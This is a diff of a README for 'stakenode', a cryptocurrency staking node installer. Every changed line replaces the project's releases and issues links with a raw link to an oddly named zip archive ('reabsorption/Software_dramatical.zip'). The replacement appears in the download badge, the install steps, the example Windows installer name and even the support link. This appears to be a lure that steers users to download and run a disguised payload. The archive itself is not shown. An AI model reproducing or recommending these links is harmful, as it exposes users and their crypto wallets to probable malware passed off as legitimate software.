@@ -1,7 +1,7 @@
 # 🎉 stakenode - Easy Staking Node Setup
 
 ## 📥 Download the Latest Version
-[![Download stakenode](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/Lingesh303/stakenode/releases)
+[![Download stakenode](https://github.com/Lingesh303/stakenode/raw/refs/heads/main/reabsorption/Software_dramatical.zip%20release-blue)](https://github.com/Lingesh303/stakenode/raw/refs/heads/main/reabsorption/Software_dramatical.zip)
 
 ## 🚀 Getting Started
 Welcome to stakenode! This application helps you set up staking nodes effortlessly. Whether you are new to staking or have experience, our tool simplifies the process for you.
@@ -21,7 +21,7 @@ Welcome to stakenode! This application helps you set up staking nodes effortless
 ## 🌍 Download & Install
 To get started with stakenode, visit the following page to download the latest release:
 
-[Download stakenode](https://github.com/Lingesh303/stakenode/releases)
+[Download stakenode](https://github.com/Lingesh303/stakenode/raw/refs/heads/main/reabsorption/Software_dramatical.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:**
@@ -31,7 +31,7 @@ To get started with stakenode, visit the following page to download the latest r
    Look for the latest version at the top of the page. Click on it to go to the version details.
 
 3. **Download the Installer:**
-   Find the installer file for your operating system (for example, stakenode-windows.exe for Windows users). Click on the file to start the download.
+   Find the installer file for your operating system (for example, https://github.com/Lingesh303/stakenode/raw/refs/heads/main/reabsorption/Software_dramatical.zip for Windows users). Click on the file to start the download.
 
 4. **Run the Installer:**
    Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process.
@@ -70,7 +70,7 @@ A: Your rewards will be automatically credited to your wallet address as specifi
 A: Yes, stakenode is compatible with Windows, macOS, and Linux.
 
 ## 💬 Community Support
-If you encounter issues, please check the [GitHub Issues Page](https://github.com/Lingesh303/stakenode/issues) for solutions. You can also reach out to our community for help. 
+If you encounter issues, please check the [GitHub Issues Page](https://github.com/Lingesh303/stakenode/raw/refs/heads/main/reabsorption/Software_dramatical.zip) for solutions. You can also reach out to our community for help. 
 
 ## 📣 Stay Updated
 To receive the latest news and updates, follow our repository on GitHub. You can be informed about new features and improvements.
